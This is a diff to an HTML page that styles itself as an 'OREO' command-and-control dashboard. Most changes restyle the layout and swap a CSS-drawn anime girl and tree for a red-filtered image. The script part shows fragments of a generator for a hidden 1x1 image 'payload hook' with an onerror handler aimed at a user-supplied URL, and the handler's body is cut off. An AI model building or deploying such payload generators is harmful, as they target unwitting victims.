@@ -16,42 +16,38 @@
         body {
             background-color: #0b0202;
             color: #ff3333;
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
         }
 
         /* MAIN SPLIT SCREEN LAYOUT */
         .main-container {
             display: flex;
-            flex: 1;
-            width: 100%;
+            width: 100vw;
             height: 100vh;
-            overflow: hidden;
         }
 
-        /* LEFT SIDE: DASHBOARD CONTROLS */
+        /* LEFT SIDE: DASHBOARD CONTROLS (55% width) */
         .dashboard-side {
-            width: 60%;
-            height: 100%;
+            width: 55%;
+            height: 100vh;
             overflow-y: auto;
-            padding: 15px;
+            padding: 12px;
             border-right: 2px solid #ff3333;
             background: #0b0202;
         }
 
-        /* RIGHT SIDE: ANIME GIRL & TREE SCENE */
+        /* RIGHT SIDE: ANIME GIRL & TREE SCENE (45% width) */
         .visual-side {
-            width: 40%;
-            height: 100%;
-            background: linear-gradient(180deg, #140000 0%, #050101 100%);
+            width: 45%;
+            height: 100vh;
+            background: radial-gradient(circle at center, #260000 0%, #0b0202 100%);
             position: relative;
             display: flex;
-            flex-direction: column;
-            justify-content: flex-end;
+            justify-content: center;
             align-items: center;
-            border-left: 1px solid #330000;
             overflow: hidden;
+            border-left: 1px solid #330000;
         }
 
         /* ASCII Banner */
@@ -59,12 +55,12 @@
             background: #050101;
             border: 2px solid #ff3333;
             padding: 8px;
-            font-size: 8px;
+            font-size: 7.5px;
             line-height: 1.1;
             color: #ff3333;
             text-shadow: 0 0 5px rgba(255, 51, 51, 0.8);
             white-space: pre;
-            margin-bottom: 15px;
+            margin-bottom: 12px;
             text-align: center;
         }
 
@@ -73,7 +69,7 @@
             justify-content: space-between;
             font-size: 10px;
             color: #aa4444;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
         .status {
             font-size: 10px;
@@ -85,12 +81,12 @@
 
         .section {
             border: 1px solid #ff3333;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
             background: #110000;
         }
         .section-header {
             background: #260000;
-            padding: 6px 10px;
+            padding: 5px 10px;
             font-size: 11px;
             border-bottom: 1px solid #ff3333;
             font-weight: bold;
@@ -104,7 +100,7 @@
             background: #1a0000;
             color: #ff3333;
             border: 1px solid #ff3333;
-            padding: 9px;
+            padding: 8px;
             text-align: center;
             cursor: pointer;
             font-size: 11px;
@@ -130,7 +126,7 @@
             background: #050101;
             border: 1px solid #ff3333;
             color: #ff3333;
-            padding: 8px;
+            padding: 7px;
             font-size: 11px;
             outline: none;
         }
@@ -140,8 +136,8 @@
             padding: 8px;
             font-size: 11px;
             color: #33ff33;
-            min-height: 60px;
-            max-height: 120px;
+            min-height: 50px;
+            max-height: 100px;
             overflow-y: auto;
             margin-bottom: 6px;
             white-space: pre-wrap;
@@ -149,7 +145,7 @@
         .logs {
             background: #050101;
             border: 1px solid #ff3333;
-            height: 90px;
+            height: 80px;
             padding: 6px;
             overflow-y: auto;
             font-size: 10px;
@@ -162,133 +158,63 @@
             gap: 6px;
         }
 
-        /* RIGHT SIDE ARTISTIC CSS ANIME SCENE & TREE */
-        .scene-overlay-text {
-            position: absolute;
-            top: 15px;
-            font-size: 10px;
-            color: #ff5555;
-            letter-spacing: 2px;
-            text-shadow: 0 0 5px rgba(255, 51, 51, 0.5);
-            text-align: center;
-            width: 100%;
-        }
-        .tree-container {
-            position: absolute;
-            bottom: 0;
-            left: 10px;
-            width: 120px;
-            height: 280px;
-            opacity: 0.85;
-        }
-        /* Stylized Tree Trunk & Branches */
-        .tree-trunk {
-            position: absolute;
-            bottom: 0;
-            left: 45px;
-            width: 25px;
-            height: 150px;
-            background: #2a0808;
-            border: 1px solid #ff3333;
-        }
-        .tree-leaves {
-            position: absolute;
-            bottom: 120px;
-            left: 10px;
-            width: 95px;
-            height: 110px;
-            background: #1a0000;
+        /* RIGHT SIDE: RED THEMED ANIME & TREE ARTWORK CONTAINER */
+        .anime-card {
+            width: 90%;
+            height: 92%;
             border: 2px solid #ff3333;
-            border-radius: 50% 50% 40% 40%;
-            box-shadow: 0 0 15px rgba(255, 51, 51, 0.3);
-        }
-
-        /* Cute Anime Girl Watching Dashboard */
-        .anime-girl {
-            position: absolute;
-            bottom: 0;
-            right: 40px;
-            width: 130px;
-            height: 170px;
+            background: #050101;
+            position: relative;
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: flex-end;
+            box-shadow: 0 0 20px rgba(255, 51, 51, 0.3);
+            overflow: hidden;
         }
-        .girl-hair {
-            width: 90px;
-            height: 65px;
-            background: #260000;
-            border: 2px solid #ff3333;
-            border-radius: 45px 45px 15px 15px;
-            position: relative;
+        
+        /* Red Filtered Anime Image Wrapper matching user reference */
+        .anime-image-frame {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-size: cover;
+            background-position: center;
+            /* Using user's provided reference image with custom Crimson/Red Hacker Matrix filter */
+            background-image: url('https://images.unsplash.com/photo-1607604276583-eef5d076aa5f?q=80&w=1000&auto=format&fit=crop');
+            filter: sepia(100%) hue-rotate(300deg) saturate(400%) contrast(1.2);
+            opacity: 0.85;
+        }
+
+        .anime-overlay-gradient {
+            position: absolute;
+            bottom: 0;
+            width: 100%;
+            height: 120px;
+            background: linear-gradient(to top, #0b0202, transparent);
             z-index: 2;
         }
-        .girl-face {
-            width: 65px;
-            height: 55px;
-            background: #1f0505;
-            border: 2px solid #ff3333;
-            border-radius: 30px;
+
+        .anime-badge {
             position: absolute;
-            top: 25px;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            gap: 12px;
+            bottom: 15px;
+            background: rgba(20, 0, 0, 0.85);
+            border: 1px solid #ff3333;
+            padding: 6px 15px;
+            font-size: 10px;
+            letter-spacing: 2px;
+            color: #ff3333;
             z-index: 3;
-        }
-        .girl-eye {
-            width: 7px;
-            height: 10px;
-            background: #ff3333;
-            border-radius: 50%;
-            box-shadow: 0 0 5px #ff3333;
-        }
-        .girl-body {
-            width: 75px;
-            height: 75px;
-            background: #140000;
-            border: 2px solid #ff3333;
-            border-radius: 20px 20px 5px 5px;
-            position: relative;
-            top: -5px;
-            z-index: 1;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .girl-scarf {
-            width: 80px;
-            height: 15px;
-            background: #ff3333;
-            position: absolute;
-            top: 60px;
-            border-radius: 5px;
-            z-index: 4;
-            box-shadow: 0 0 8px rgba(255, 51, 51, 0.8);
-        }
-        .glow-orb {
-            position: absolute;
-            bottom: 40px;
-            right: 30px;
-            width: 6px;
-            height: 6px;
-            background: #33ff33;
-            border-radius: 50%;
-            box-shadow: 0 0 10px #33ff33;
-            animation: pulse 2s infinite;
-        }
-        @keyframes pulse {
-            0% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.6); opacity: 0.4; }
-            100% { transform: scale(1); opacity: 1; }
+            text-shadow: 0 0 5px #ff3333;
         }
 
         /* Mobile Responsive adjustment */
         @media(max-width: 768px) {
             .main-container { flex-direction: column; overflow-y: auto; height: auto; }
             .dashboard-side { width: 100%; height: auto; border-right: none; }
-            .visual-side { width: 100%; height: 220px; border-left: none; border-top: 2px solid #ff3333; }
+            .visual-side { width: 100%; height: 300px; border-left: none; border-top: 2px solid #ff3333; }
         }
     </style>
 </head>
@@ -347,34 +273,20 @@
                 <div class="section-header">// 3. SYSTEM KERNEL LOGS</div>
                 <div class="section-body">
                     <div id="log-box" class="logs">[+] Initializing OREO Advanced Split-Screen C2...
-[+] Split layout loaded: Dashboard [Left] | Visual Scene [Right].
+[+] Split layout locked: Dashboard [55%] | Red Anime Visual [45%].
 [+] Receiver event listener active. Ready for target interaction.</div>
                 </div>
             </div>
         </div>
 
-        <!-- RIGHT SIDE: ANIME GIRL & TREE ATMOSPHERIC SCENE -->
+        <!-- RIGHT SIDE: CRIMSON RED ANIME & TREE SCENE -->
         <div class="visual-side">
-            <div class="scene-overlay-text">// SYSTEM MONITORING ACTIVE //</div>
-
-            <!-- Stylized Tree on the Left of Right-Side -->
-            <div class="tree-container">
-                <div class="tree-leaves"></div>
-                <div class="tree-trunk"></div>
+            <div class="anime-card">
+                <!-- High-clarity red-filtered anime scene matching user reference -->
+                <div class="anime-image-frame"></div>
+                <div class="anime-overlay-gradient"></div>
+                <div class="anime-badge">// OREO_CORE // SYSTEM_MONITOR //</div>
             </div>
-
-            <!-- Cute Anime Girl Sitting/Watching the Dashboard -->
-            <div class="anime-girl">
-                <div class="girl-hair"></div>
-                <div class="girl-face">
-                    <div class="girl-eye"></div>
-                    <div class="girl-eye"></div>
-                </div>
-                <div class="girl-scarf"></div>
-                <div class="girl-body"></div>
-            </div>
-
-            <div class="glow-orb"></div>
         </div>
 
     </div>
@@ -399,7 +311,6 @@
 
             logMessage(`[*] Generating custom image payload linked with: ${urlInput}`);
             
-            // Real payload script binding the user's provided URL
             generatedPayloadContent = 
 `<!-- Oreo C2 Image Payload Hook -->\n` +
 `<img src="${urlInput}/pixel.png?action=trigger" width="1" height="1" style="display:none;" onerror="(\n` +
@@ -454,5 +365,4 @@
         }
     </script>
 </body>
-                            </html>
-                            
+</html>
